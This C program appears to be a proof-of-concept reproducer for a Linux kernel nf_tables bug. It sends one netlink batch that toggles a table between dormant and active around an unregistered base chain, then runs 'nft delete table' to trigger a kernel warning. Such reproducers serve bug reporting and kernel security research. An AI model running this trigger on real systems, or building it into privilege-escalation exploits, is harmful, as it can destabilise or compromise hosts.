#define _GNU_SOURCE
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <stddef.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <time.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>

struct unft_base_chain_param {
    uint32_t hook_num;
    uint32_t prio;
};

struct nftnl_table* build_table(char* name, uint16_t family) {
    struct nftnl_table* t = nftnl_table_alloc();
    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);
    return t;
}

struct nftnl_chain* build_chain(char* table_name, char* chain_name, struct unft_base_chain_param* base_param, uint32_t chain_id) {
    struct nftnl_chain* c;
    c = nftnl_chain_alloc();
    nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table_name);
    if (base_param) {
        nftnl_chain_set_u32(c, NFTNL_CHAIN_HOOKNUM, base_param->hook_num);
        nftnl_chain_set_u32(c, NFTNL_CHAIN_PRIO, base_param->prio);
    }
    if (chain_id) {
        nftnl_chain_set_u32(c, NFTNL_CHAIN_ID, chain_id);
    }
    return c;
}

int main(void) {
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    struct mnl_nlmsg_batch *batch;
    int ret;
    int seq = time(NULL);
    uint8_t family = NFPROTO_IPV4;

    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
		perror("mnl_socket_open");
		exit(EXIT_FAILURE);
	}
	
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		exit(EXIT_FAILURE);
	} 

    // Start nl message
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);
	
    // Create active table "test_table" [1]
    struct nftnl_table * t = build_table("test_table", NFPROTO_IPV4);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, t);
    mnl_nlmsg_batch_next(batch);
	
	// Update table "test_table" -- table is now dormant [2]
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_set_u32(t, NFTNL_TABLE_FLAGS, 0x1);
    nftnl_table_nlmsg_build_payload(nlh, t);
    mnl_nlmsg_batch_next(batch);
    
    // Add basechain "chain1" -- not registered [3]
    struct unft_base_chain_param bp2;
    bp2.hook_num = NF_INET_LOCAL_OUT;
    bp2.prio = 11;
    struct nftnl_chain * c = build_chain("test_table", "chain1", &bp2, 11);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, c);
	mnl_nlmsg_batch_next(batch);
	
	// Update table "test_table" -- table is now active [4]
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_set_u32(t, NFTNL_TABLE_FLAGS, 0x0);
    nftnl_table_nlmsg_build_payload(nlh, t);
    mnl_nlmsg_batch_next(batch);
    
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Send netlink message
    printf("[+] mengirim pesan Netlink 1\n");
	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
    mnl_nlmsg_batch_stop(batch);
    
    // Trigger warning, harus mode root
    system("nft delete table test_table");

    return 0;
}